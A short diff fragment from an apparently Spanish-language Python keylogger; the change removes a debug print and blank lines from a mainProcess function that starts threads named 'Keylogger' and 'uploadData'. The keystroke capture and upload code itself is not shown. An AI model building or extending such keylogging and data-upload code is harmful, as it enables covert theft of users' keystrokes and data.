@@ -106,9 +106,6 @@ def uploadData():
 
 def mainProcess():
       print('Proceso principal.')
-      print('Activando hilo1')
-
-
       
       p01 = threading.Thread(name='Keylogger', target=keylogger)
       p02 = threading.Thread(name='uploadData', target=uploadData)
